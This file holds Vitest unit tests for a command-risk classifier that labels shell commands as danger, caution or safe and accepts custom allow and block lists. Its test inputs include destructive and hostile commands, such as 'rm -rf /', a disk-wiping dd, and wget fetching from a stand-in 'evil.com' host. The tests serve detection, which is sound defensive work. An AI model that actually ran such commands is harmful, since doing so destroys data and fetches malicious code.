import { describe, it, expect } from 'vitest';
import { assessCommandRisk } from '../src/command-risk.js';

describe('assessCommandRisk', () => {
  describe('DANGER patterns', () => {
    it('should flag rm -rf as danger', () => {
      const result = assessCommandRisk('rm', ['-rf', '/']);
      expect(result.level).toBe('danger');
      expect(result.reason).toContain('Destructive');
    });

    it('should flag sudo as danger', () => {
      const result = assessCommandRisk('sudo', ['apt', 'install', 'pkg']);
      expect(result.level).toBe('danger');
      expect(result.reason).toContain('Elevated privilege');
    });

    it('should flag curl as danger', () => {
      const result = assessCommandRisk('curl', ['http://example.com/payload']);
      expect(result.level).toBe('danger');
      expect(result.reason).toContain('Network request');
    });

    it('should flag wget as danger', () => {
      const result = assessCommandRisk('wget', ['http://evil.com/malware']);
      expect(result.level).toBe('danger');
      expect(result.reason).toContain('Network download');
    });

    it('should flag chmod 777 as danger', () => {
      const result = assessCommandRisk('chmod', ['777', '/etc/passwd']);
      expect(result.level).toBe('danger');
      expect(result.reason).toContain('world-writable');
    });

    it('should flag kill -9 as danger', () => {
      const result = assessCommandRisk('kill', ['-9', '1234']);
      expect(result.level).toBe('danger');
      expect(result.reason).toContain('Force-killing');
    });

    it('should flag dd as danger', () => {
      const result = assessCommandRisk('dd', ['if=/dev/zero', 'of=/dev/sda']);
      expect(result.level).toBe('danger');
      expect(result.reason).toContain('disk');
    });

    it('should flag eval as danger', () => {
      const result = assessCommandRisk('eval', ['$(malicious_code)']);
      expect(result.level).toBe('danger');
      expect(result.reason).toContain('Dynamic code');
    });

    it('should flag git push --force as danger', () => {
      const result = assessCommandRisk('git', ['push', '--force']);
      expect(result.level).toBe('danger');
      expect(result.reason).toContain('Force-pushing');
    });

    it('should flag git reset --hard as danger', () => {
      const result = assessCommandRisk('git', ['reset', '--hard']);
      expect(result.level).toBe('danger');
      expect(result.reason).toContain('Hard reset');
    });
  });

  describe('CAUTION patterns', () => {
    it('should flag npm install as caution', () => {
      const result = assessCommandRisk('npm', ['install', 'lodash']);
      expect(result.level).toBe('caution');
      expect(result.reason).toContain('npm package');
    });

    it('should flag pip install as caution', () => {
      const result = assessCommandRisk('pip', ['install', 'requests']);
      expect(result.level).toBe('caution');
      expect(result.reason).toContain('Python package');
    });

    it('should flag git push as caution', () => {
      const result = assessCommandRisk('git', ['push', 'origin', 'main']);
      expect(result.level).toBe('caution');
      expect(result.reason).toContain('Pushing');
    });

    it('should flag docker run as caution', () => {
      const result = assessCommandRisk('docker', ['run', 'nginx']);
      expect(result.level).toBe('caution');
      expect(result.reason).toContain('Docker container');
    });

    it('should flag npx as caution', () => {
      const result = assessCommandRisk('npx', ['some-package']);
      expect(result.level).toBe('caution');
      expect(result.reason).toContain('npm package');
    });
  });

  describe('SAFE patterns', () => {
    it('should flag git add as safe', () => {
      const result = assessCommandRisk('git', ['add', '.']);
      expect(result.level).toBe('safe');
    });

    it('should flag git status as safe', () => {
      const result = assessCommandRisk('git', ['status']);
      expect(result.level).toBe('safe');
    });

    it('should flag ls as safe', () => {
      const result = assessCommandRisk('ls', ['-la']);
      expect(result.level).toBe('safe');
    });

    it('should flag npm test as safe', () => {
      const result = assessCommandRisk('npm', ['test']);
      expect(result.level).toBe('safe');
    });

    it('should flag npm run build as safe', () => {
      const result = assessCommandRisk('npm', ['run', 'build']);
      expect(result.level).toBe('safe');
    });

    it('should flag tsc as safe', () => {
      const result = assessCommandRisk('tsc', []);
      expect(result.level).toBe('safe');
    });
  });

  describe('unknown commands', () => {
    it('should default unknown commands to safe', () => {
      const result = assessCommandRisk('my-custom-tool', ['arg1', 'arg2']);
      expect(result.level).toBe('safe');
      expect(result.reason).toBe('Standard command');
    });
  });

  describe('custom config', () => {
    it('should allow custom allowlist to override defaults', () => {
      const config = {
        allowlist: [{ pattern: 'curl', risk: 'safe' as const, reason: 'Internal API call' }],
        blocklist: [],
      };
      const result = assessCommandRisk('curl', ['http://internal-api.local'], config);
      expect(result.level).toBe('safe');
      expect(result.reason).toBe('Internal API call');
    });

    it('should allow custom blocklist to flag commands as danger', () => {
      const config = {
        allowlist: [],
        blocklist: [{ pattern: 'bad-tool', risk: 'danger' as const, reason: 'Known malicious' }],
      };
      const result = assessCommandRisk('bad-tool', ['--exploit'], config);
      expect(result.level).toBe('danger');
      expect(result.reason).toBe('Known malicious');
    });

    it('should check config before defaults', () => {
      const config = {
        allowlist: [{ pattern: 'rm -rf', risk: 'safe' as const, reason: 'Approved cleanup script' }],
        blocklist: [],
      };
      const result = assessCommandRisk('rm', ['-rf', 'temp/'], config);
      expect(result.level).toBe('safe');
      expect(result.reason).toBe('Approved cleanup script');
    });
  });
});
